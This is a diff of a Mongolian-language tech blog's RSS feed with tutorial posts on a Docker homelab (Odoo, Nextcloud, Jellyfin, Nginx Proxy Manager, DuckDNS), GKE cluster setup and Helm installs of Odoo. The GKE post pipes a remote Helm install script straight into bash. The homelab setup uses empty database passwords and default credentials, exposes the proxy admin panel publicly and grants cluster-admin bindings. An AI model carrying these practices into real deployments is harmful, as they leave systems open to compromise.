+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">odoo</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker.io/bitnami/odoo:17</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">odoo</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PUID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PGID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">TZ=Asia/Ulaanbaatar</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ALLOW_EMPTY_PASSWORD=yes</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ODOO_DATABASE_HOST=postgresql</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ODOO_DATABASE_PORT_NUMBER=5432</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ODOO_DATABASE_USER=bn_odoo</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ODOO_DATABASE_NAME=bitnami_odoo</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./odoo/odoo-persistence:/bitnami/odoo</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">postgresql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># default cred: user@example.com, bitnami</span>
+</span></span></code></pre></div><p>docker ps</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CONTAINER ID   IMAGE                                      COMMAND                  CREATED       STATUS       PORTS                                                                                  NAMES
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e6609eb542bd   bitnami/odoo:17                            <span style="color:#e6db74">&#34;/opt/bitnami/script…&#34;</span>   <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   3000/tcp, 8069/tcp, 8072/tcp                                                           odoo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>58afb26eb6ce   lscr.io/linuxserver/nextcloud:latest       <span style="color:#e6db74">&#34;/init&#34;</span>                  <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   80/tcp, 443/tcp                                                                        nextcloud
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dc45338ecfa2   lscr.io/linuxserver/homeassistant:latest   <span style="color:#e6db74">&#34;/init&#34;</span>                  <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   8123/tcp                                                                               homeassistant
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>e0798c155a37   bitnami/postgresql:16                      <span style="color:#e6db74">&#34;/opt/bitnami/script…&#34;</span>   <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   5432/tcp                                                                               postgresql
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>9c57715192a9   jc21/nginx-proxy-manager:latest            <span style="color:#e6db74">&#34;/init&#34;</span>                  <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   0.0.0.0:80-81-&gt;80-81/tcp, :::80-81-&gt;80-81/tcp, 0.0.0.0:443-&gt;443/tcp, :::443-&gt;443/tcp   nginxproxymanager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>26b9483c3e2d   lscr.io/linuxserver/jellyfin:latest        <span style="color:#e6db74">&#34;/init&#34;</span>                  <span style="color:#ae81ff">5</span> hours ago   Up <span style="color:#ae81ff">5</span> hours   8096/tcp, 8920/tcp                                                                     jellyfin
+</span></span></code></pre></div><h4 id="port-нээх">Port нээх</h4>
+<p>docker expose хийсэн портуудыг хост талдаа нээнэ.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Host port нээх</span>
+</span></span><span style="display:flex;"><span>sudo firewall-cmd --zone<span style="color:#f92672">=</span>public --add-service<span style="color:#f92672">=</span>http --permanent
+</span></span><span style="display:flex;"><span>sudo firewall-cmd --zone<span style="color:#f92672">=</span>public --add-port 8080/tcp --permanent
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># reload хийх</span>
+</span></span><span style="display:flex;"><span>sudo firewall-cmd --reload
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># port шалгах</span>
+</span></span><span style="display:flex;"><span>sudo firewall-cmd --zone<span style="color:#f92672">=</span>public --list-ports
+</span></span></code></pre></div><h3 id="host-д-persist-хийгдсэн-volume">Host-д persist хийгдсэн volume</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#pwd</span>
+</span></span><span style="display:flex;"><span>/home/alma/docker/compose
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ls -la -d * */*</span>
+</span></span><span style="display:flex;"><span>-rw-rw-r--. <span style="color:#ae81ff">1</span> alma             alma <span style="color:#ae81ff">2022</span> Jan <span style="color:#ae81ff">18</span> 00:59 docker-compose.yml
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">3</span> root             root   <span style="color:#ae81ff">20</span> Jan  <span style="color:#ae81ff">6</span> 01:49 hass
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">8</span> alma             alma <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 01:21 hass/config
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">5</span> root             root   <span style="color:#ae81ff">49</span> Jan  <span style="color:#ae81ff">6</span> 01:49 jellyfin
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">6</span> alma             alma  <span style="color:#ae81ff">179</span> Jan <span style="color:#ae81ff">16</span> 09:28 jellyfin/config
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">2</span> alma             alma <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">14</span> 07:43 jellyfin/movies
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">4</span> alma             alma   <span style="color:#ae81ff">54</span> Jan <span style="color:#ae81ff">14</span> 07:43 jellyfin/tvshows
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">4</span> root             root   <span style="color:#ae81ff">33</span> Jan  <span style="color:#ae81ff">6</span> 01:49 nextcloud
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">7</span> alma             alma   <span style="color:#ae81ff">95</span> Jan  <span style="color:#ae81ff">6</span> 02:30 nextcloud/appdata
+</span></span><span style="display:flex;"><span>drwxrwx---. <span style="color:#ae81ff">5</span> alma             alma  <span style="color:#ae81ff">158</span> Jan <span style="color:#ae81ff">18</span> 06:30 nextcloud/data
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">4</span> root             root   <span style="color:#ae81ff">37</span> Jan  <span style="color:#ae81ff">6</span> 01:49 nginx
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">7</span> root             root  <span style="color:#ae81ff">137</span> Jan <span style="color:#ae81ff">18</span> 06:02 nginx/data
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">8</span> root             root  <span style="color:#ae81ff">104</span> Jan <span style="color:#ae81ff">18</span> 06:02 nginx/letsencrypt
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">3</span> root             root   <span style="color:#ae81ff">30</span> Jan <span style="color:#ae81ff">17</span> 23:28 odoo
+</span></span><span style="display:flex;"><span>drwxrwxr-x. <span style="color:#ae81ff">5</span> systemd-coredump root   <span style="color:#ae81ff">44</span> Jan <span style="color:#ae81ff">18</span> 01:01 odoo/odoo-persistence
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">3</span> root             root   <span style="color:#ae81ff">36</span> Jan <span style="color:#ae81ff">18</span> 00:54 postgresql
+</span></span><span style="display:flex;"><span>drwxr-xr-x. <span style="color:#ae81ff">3</span>             <span style="color:#ae81ff">1001</span> <span style="color:#ae81ff">1001</span>   <span style="color:#ae81ff">18</span> Jan <span style="color:#ae81ff">18</span> 00:58 postgresql/postgresql-persistence
+</span></span></code></pre></div><p>non-root container-н хувьд permission алдаа заавал, жишээ нь postgresql:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chown -R 1001:1001 postgresql/postgresql-persistence
+</span></span></code></pre></div><p>Jellyfin library-гаа sync хийж чадахгүй байвал:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chown -R alma:alma movies
+</span></span><span style="display:flex;"><span>sudo chmod -R <span style="color:#ae81ff">755</span> movies <span style="color:#75715e">#tvshows</span>
+</span></span></code></pre></div><h3 id="nginx-proxy-manager">Nginx proxy manager</h3>
+<p><code>http://server-ip:81</code> хандан default creds-р (<code>admin@example.com</code> pass: <code>changeme</code>) нэвтэрнэ. Дараа нь <a href="https://duckdns.org/">DuckDNS</a> бүртгүүлээд sub domain (жишээ нь <code>hosono</code>.duckdns.org г.м) авна. <code>Current IP</code> хэсэгт host-н IP (192.168.1.200 г.м) save хийнэ дээд хэсэгт <code>token</code> -copy хийнэ.</p>
+<p>Nginx proxy manager -&gt; SSL Certificate -&gt; Add Let&rsquo;s Encrypt Certificate -&gt;  Let&rsquo;s Encrypt орон Domain Names хэсэгт DuckDNS авсан domain-аа (<code>*.hosono.duckdns.org</code> болон <code>hosono.duckdns.org</code>) оруулна. Email хэсэгт мэдэгдэл авах мэйл хаягаа оруулна. Use a DNS Challenge -г enable хийгээд <code>DuckDNS</code> сонгоод <code>dns_duckdns_token=өмнө copy хийсэн token-oo энд paste хийнэ</code>. Propagation Seconds хэсэгт <code>120</code> гэж бичээд save. Алдаа заавал дахин save хийнэ.</p>
+<h4 id="proxy-entry">Proxy entry</h4>
+<p><code>hosono.duckdns.org</code> -г <code>http://nginxproxymanager:81</code>
+<code>jellyfin.hosono.duckdns.org</code> -г <code>http://jellyfin:8096</code> гэх мэтээр Certificate тохируулахад Proxy host-ууд бүртгэнэ.</p>
+<p>Domain Names хэсэгт бүртгэж буй sub domain-аа бичин, Scheme хэсэгт <code>http</code> <code>https</code> -с сонгоно. container талаас 443 default хийгдээгүй л бол ихэхндээ <code>http</code> -г сонгоно.  Forward Hostname / IP хэсэгт container name эсхүл 127.0.0.1 байж болно.</p>
+<p>SSL хэсэгт SSL Certificate -д бүртгэсэн DuckDNS -с сонгоод Force SSL, HTTP/2 Support гэдгийг сонгоод хадаглах юм. Энэ мэтээр subdomain -уудаа бүртгэнэ.</p>
+<table>
+<thead>
+<tr>
+<th>SOURCE</th>
+<th>DESTINATION</th>
+<th>SSL</th>
+<th>ACCESS</th>
+<th>STATUS</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>home.hosono.duckdns.org</td>
+<td>http://homeassistant:8123</td>
+<td>Let&rsquo;s Encrypt</td>
+<td>Public</td>
+<td>Online</td>
+</tr>
+<tr>
+<td>hosono.duckdns.org</td>
+<td>http://nginxproxymanager:81</td>
+<td>Let&rsquo;s Encrypt</td>
+<td>Public</td>
+<td>Online</td>
+</tr>
+<tr>
+<td>jellyfin.hosono.duckdns.org</td>
+<td>http://jellyfin:8096</td>
+<td>Let&rsquo;s Encrypt</td>
+<td>Public</td>
+<td>Online</td>
+</tr>
+<tr>
+<td>nextcloud.hosono.duckdns.org</td>
+<td>https://nextcloud:443</td>
+<td>Let&rsquo;s Encrypt</td>
+<td>Public</td>
+<td>Online</td>
+</tr>
+<tr>
+<td>odoo.hosono.duckdns.org</td>
+<td>http://odoo:8069</td>
+<td>Let&rsquo;s Encrypt</td>
+<td>Public</td>
+<td>Online</td>
+</tr>
+</tbody>
+</table>
+<h5 id="ha">HA</h5>
+<p>http://homeassistant:8123 хувьд Proxy бүртгэх дээ Websockets Supports гэдгийг чагтлан өгнө. Дараа нь npm ажиллаж байгаа IP хаягийн мэдээллийг аван HASS дотор configuration.yml -г trusted_proxy хэсэгт npm нэмэн оруулна</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker inspect nginxproxymanager
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;IPAddress&#34;</span>: <span style="color:#e6db74">&#34;172.23.0.2&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /home/alma/docker/compose/hass/config</span>
+</span></span><span style="display:flex;"><span>vi configuration.yaml
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>http:
+</span></span><span style="display:flex;"><span>  use_x_forwarded_for: true
+</span></span><span style="display:flex;"><span>  trusted_proxies:
+</span></span><span style="display:flex;"><span>    - 172.23.0.0/24
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># - 172.23.0.5</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h3 id="watchtower">Watchtower</h3>
+<p>Гараар container-ууд update хийнэ.
+/Docker-compose дотор байнга ажилладаг байхаар тохируулж бас болно/</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --run-once
+</span></span></code></pre></div><h3 id="bookmarks">Bookmarks</h3>
+<ul>
+<li><a href="https://youtu.be/qlcVx-k-02E">https://youtu.be/qlcVx-k-02E</a></li>
+<li><a href="https://notthebe.ee/blog/easy-ssl-in-homelab-dns01/">https://notthebe.ee/blog/easy-ssl-in-homelab-dns01/</a></li>
+<li><a href="https://github.com/bitnami/containers/tree/main/bitnami/odoo#configuration">https://github.com/bitnami/containers/tree/main/bitnami/odoo#configuration</a></li>
+<li><a href="https://linux.how2shout.com/how-to-open-or-close-ports-in-almalinux-8-or-rocky-firewall/">https://linux.how2shout.com/how-to-open-or-close-ports-in-almalinux-8-or-rocky-firewall/</a></li>
+<li><a href="https://techoverflow.net/2020/01/28/how-to-fix-bitnami-mariadb-mkdir-cannot-create-directory-bitnami-mariadb-permission-denied/">https://techoverflow.net/2020/01/28/how-to-fix-bitnami-mariadb-mkdir-cannot-create-directory-bitnami-mariadb-permission-denied/</a></li>
+<li><a href="https://github.com/containrrr/watchtower/discussions/901">https://github.com/containrrr/watchtower/discussions/901</a></li>
+<li><a href="https://containrrr.dev/watchtower/">https://containrrr.dev/watchtower/</a></li>
+</ul>
+]]></content:encoded>
     </item>
     <item>
       <title>GKE дээр Odoo-г суулгах</title>
@@ -33,6 +511,73 @@
       <pubDate>Thu, 14 Jan 2021 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2021-01-14-gke-kubernetes/</guid>
       <description>GKE дээр Odoo-г суулгах</description>
+      <content:encoded><![CDATA[<h2 id="gke-дээр-helm-күбернетес-ашиглан-жишээ-апплкейшн-суулгаж-тохируулах">GKE дээр Helm, Күбернетес ашиглан жишээ апплкейшн суулгаж тохируулах</h2>
+<ul>
+<li>Google Kubernetes Engine дээр кластер үүсгэх</li>
+<li>Helm, Tiller суулгах</li>
+<li>TLS Key үүсгэх</li>
+<li>Odoo-г суулгах</li>
+</ul>
+<h3 id="google-kubernetes-engine-дээр-кластер-үүсгэх">Google Kubernetes Engine дээр кластер үүсгэх</h3>
+<p><a href="https://cloud.google.com">Google Cloud Platform</a> дээр Google Kubernetes Engine дээр кластер үүсгэх Helm Chart суулгаж TLS, Cert-Manager суулган тохируулж сүүлд нь Odoo-г суулгаж үзнэ.</p>
+<ul>
+<li><a href="https://cloud.google.com/sdk/docs/install">gcloud суулгах</a></li>
+<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/#install-kubectl">kubectl суулгах</a></li>
+</ul>
+<p><code>gcloud</code> дамжуулан GCP - тэй холбогдоно. Google Cloud Platform - бүртгэл байхгүй бол эхлээд бүртгүүлээрэй.</p>
+<p><code>kubectl</code> gcloud суулгасан бол дээр байгаа гарын авлага ашиглахгүй kubectl суулгая гэвэл:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud components install kubectl
+</span></span></code></pre></div><p>Кластер үүсгэхээсээ ѳмнѳ нэвтрэн орно:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud auth application-default login
+</span></span></code></pre></div><p>Нэвтрэн орсон бол доорк коммандараар шинэ прожект үүсгэнэ:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud projects create <span style="color:#e6db74">${</span>PROJECT<span style="color:#e6db74">}</span>
+</span></span></code></pre></div><p>Эсхүл заавал CLI-ээр үүсгэхгүй гэвэл GCP дээрээс browser дээрээс орон шинэ прожект үүсгэж болно. Терминал дээрээ ѳѳрийн тѳслийг default болгож zone тохиргоо хийх бол:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud config set project <span style="color:#e6db74">${</span>PROJECT<span style="color:#e6db74">}</span> 
+</span></span><span style="display:flex;"><span>gcloud config set compute/zone <span style="color:#e6db74">${</span>ZONE<span style="color:#e6db74">}</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>Zone жигсаалт авах бол</strong>: gcloud compute zones list</p>
+</blockquote>
+<p>Одоо шинээр үүсгэсэн тѳсѳл дотроо кластер үүсгэе. Google Kubernetes Engine -г идэвхжүүлээгүй бол эхлээд brwoser-ѳѳсѳѳ GCP -г ороод GKE-г enable хийх хийнэ. Kubernetes Engine -г ороод browser дээрээс анх удаа кластер үүсгэж байгаа хичээл болон жишиг кластер тохироог санал болгоно. Тэр аргаар нь үүсгэж болно. Эсхүл доор байгаа командаар үүсгэж болно.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud beta container --project <span style="color:#e6db74">${</span>PROJECT<span style="color:#e6db74">}</span> clusters create <span style="color:#e6db74">&#34;my-first-cluster-1&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --zone <span style="color:#e6db74">&#34;us-central1-c&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --no-enable-basic-auth <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --cluster-version <span style="color:#e6db74">&#34;1.16.15-gke.4901&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --machine-type <span style="color:#e6db74">&#34;e2-medium&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --image-type <span style="color:#e6db74">&#34;COS&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --disk-type <span style="color:#e6db74">&#34;pd-standard&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --disk-size <span style="color:#e6db74">&#34;100&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --scopes <span style="color:#e6db74">&#34;https://www.googleapis.com/auth/devstorage.read_only&#34;</span>,<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/logging.write&#34;</span>,<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/monitoring&#34;</span>,<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/servicecontrol&#34;</span>,<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/service.management.readonly&#34;</span>,<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/trace.append&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --no-enable-cloud-logging <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --no-enable-cloud-monitoring <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --no-enable-ip-alias <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --network <span style="color:#e6db74">&#34;projects/</span><span style="color:#e6db74">${</span>PROJECT<span style="color:#e6db74">}</span><span style="color:#e6db74">/global/networks/default&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --subnetwork <span style="color:#e6db74">&#34;projects/</span><span style="color:#e6db74">${</span>PROJECT<span style="color:#e6db74">}</span><span style="color:#e6db74">/regions/us-central1/subnetworks/default&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --addons HorizontalPodAutoscaling <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --enable-autoupgrade <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --enable-autorepair <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --enable-autoscaling <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --num-nodes <span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --min-nodes <span style="color:#e6db74">&#34;2&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --max-nodes <span style="color:#e6db74">&#34;5&#34;</span>
+</span></span></code></pre></div><p><code>zones</code>: Кластер үүсгэж байгаа сервверийн байршил.
+<code>machine-type</code>: Кластерын үүсгэж байгаа тѳхѳѳрѳмжийн сонголт. Ямар тѳрлийн тѳхѳѳрѳмж сонгхож байгаагаас үнэ болон хэдэн node үүсгэх лимит зэрэгг тодорохйлогдоно. Дэлгэрэнгүй судлах бол: <a href="https://cloud.google.com/compute/docs/machine-types">Machine Types</a>.
+<code>addons</code>: Автоматаар буюу ачаалал их болох үед node ѳргѳтгѳл хийх тохиргоо оруулав: <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/horizontal-pod-autoscaling">HorizontalPodAutoscaling</a>.
+<code>min-node</code>: Автомат ѳргѳтгѳл хийж байх үед кластерт хамгийн бага байх node.
+<code>max-node</code>: Автомат ѳргѳтгѳл хийж байх үед кластерт хамгийн их байх node.</p>
+<p>Шинээр үүсгэсэн кластерт role binding тохируулна:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcloud container clusters get-credentials <span style="color:#e6db74">${</span>Кластер нэр<span style="color:#e6db74">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl create clusterrolebinding cluster-admin-binding <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --clusterrole cluster-admin <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --user <span style="color:#66d9ef">$(</span>gcloud config get-value account<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><h3 id="helm-суулгах">Helm суулгах</h3>
+<p>Helm суулгах:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl https://raw.githubusercontent.com/helm/helm/master/scripts/get | bash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl create serviceaccount -n kube-system tiller 
+</span></span><span style="display:flex;"><span>kubectl create clusterrolebinding tiller-cluster-rule <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --clusterrole<span style="color:#f92672">=</span>cluster-admin --serviceaccount<span style="color:#f92672">=</span>kube-system:tiller
+</span></span></code></pre></div><p>to be continued&hellip;</p>
+]]></content:encoded>
     </item>
     <item>
       <title>Helm Chart ашиглан Odoo-г локал орчинд суулгах</title>
@@ -40,6 +585,62 @@
       <pubDate>Wed, 13 Jan 2021 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2021-01-13-kubernetes-with-odoo/</guid>
       <description>Helm Chart ашиглан Odoo-г локал орчинд суулгах</description>
+      <content:encoded><![CDATA[<p><a href="https://github.com/helm/helm">Kubernetes Helm</a>-г ашиглан <a href="https://bitnami.com/">bitnami</a> тохируулсан апплкэйшнг Күбернетесд суулган үзье. Ингэснээр Күбернетес ажиллагааг энгийн хялбар аргаар харж туршиж болно.</p>
+<p><code>minikube start</code>-г терминал дээр бичин күбернетэс кластераа ажилууллсан бол:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Bitnami Helm Chart рэпо-г эхлээд нэмнэ.</span>
+</span></span><span style="display:flex;"><span>$ helm repo add bitnami https://charts.bitnami.com/bitnami
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Default namespace-т my-release - нэрэээр Odoo-г суулгана.</span>
+</span></span><span style="display:flex;"><span>$ helm install my-release bitnami/odoo
+</span></span></code></pre></div><p>Дээрх коммандууыг ажиллуусан бол output терминал дээр харуулна.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>NAME: my-release
+</span></span><span style="display:flex;"><span>LAST DEPLOYED: ***
+</span></span><span style="display:flex;"><span>NAMESPACE: default
+</span></span><span style="display:flex;"><span>STATUS: deployed
+</span></span><span style="display:flex;"><span>REVISION: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>TEST SUITE: None
+</span></span><span style="display:flex;"><span>NOTES:
+</span></span><span style="display:flex;"><span>*******************************************************************
+</span></span><span style="display:flex;"><span>*** PLEASE BE PATIENT: Odoo may take a few minutes to install   ***
+</span></span><span style="display:flex;"><span>*******************************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1. Get the Odoo URL by running:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>** Please ensure an external IP is associated to the my-release-odoo service before proceeding **
+</span></span><span style="display:flex;"><span>** Watch the status using: kubectl get svc --namespace default -w my-release-odoo **
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  export SERVICE_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl get svc --namespace default my-release-odoo --template <span style="color:#e6db74">&#34;{{ range (index .status.loadBalancer.ingress 0) }}{{.}}{{ end }}&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;Odoo URL: http://</span>$SERVICE_IP<span style="color:#e6db74">/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2. Obtain the login credentials
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  export ODOO_EMAIL<span style="color:#f92672">=</span>user@example.com
